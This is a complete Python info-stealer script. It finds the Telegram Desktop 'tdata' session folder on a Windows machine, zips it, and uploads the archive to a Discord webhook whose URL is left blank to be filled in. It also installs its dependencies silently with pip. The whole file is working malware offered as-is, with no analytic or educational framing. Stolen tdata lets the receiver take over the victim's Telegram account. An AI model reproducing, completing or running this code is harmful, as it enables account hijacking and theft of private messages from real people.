import os
import shutil
import tempfile
from random import choices

try:
    import discord
except ImportError:
    os.system("pip install discord")
    os.system("pip install audioop-lts")
    os.system("pip install requests")
finally:
    import discord


DISCORD_WEBHOOK_URL = ""


def steal_telegram():
    webhook = discord.SyncWebhook.from_url(DISCORD_WEBHOOK_URL)

    telegram_path = os.path.join(os.getenv("APPDATA"), "Telegram Desktop")
    if not os.path.exists(telegram_path):
        raise FileNotFoundError("Telegram not found")
    
    for root, dirs, files in os.walk(telegram_path):
        if "tdata" in dirs and "Telegram.exe" in files:
            tdata_folder = os.path.join(root, "tdata")
            break
        else:
            raise ImportError("Fake folder")

    
    with tempfile.TemporaryDirectory() as temp_dir:
        shutil.copytree(tdata_folder, temp_dir, dirs_exist_ok=True, ignore=shutil.ignore_patterns("working", "user_data", "user_data#2", "emoji", "dumps", "tdummy", "temp"))

        archieve_dir = os.path.join(os.getenv("TEMP"), random_string())
        shutil.make_archive(archieve_dir, "zip", temp_dir)

    webhook.send(file=discord.File(archieve_dir + ".zip"))
    os.remove(archieve_dir + ".zip")


def random_string():
    return ''.join(choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=6))


def main():
    print("In process...")
    steal_telegram()
    print("Success!")


if __name__ == "__main__":
    main()